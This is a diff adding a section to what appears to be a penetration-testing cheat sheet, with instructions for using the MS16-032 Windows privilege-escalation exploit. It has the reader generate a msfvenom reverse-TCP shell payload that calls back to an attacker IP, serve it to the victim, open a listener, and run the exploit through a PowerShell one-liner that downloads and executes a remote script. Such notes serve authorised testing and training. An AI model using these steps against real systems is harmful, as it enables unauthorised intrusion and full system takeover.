@@ -97,7 +97,18 @@ git clone https://github.com/worawit/MS17-010.git
 ### Windows
 #### MS16-032
 
-
+* use https://www.exploit-db.com/exploits/39719
+* Edit the file:
+  * end of file add this Invoke-MS16-032
+  * Inside th file search and find cmd.exe two times.
+  * Change with shell.exe in current directory in victim which you are.
+  * generate shell.exe:
+    * msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=6666 -f exe > shell.exe
+  * serve the shell.exe to victim
+  * open a listener
+  * run the ps1 exploit:
+   * C:\windows\sysnative\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://\<ip>/ms16032.ps1')
+  
 ## Privilege Escalation
 ### Windows
 * systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
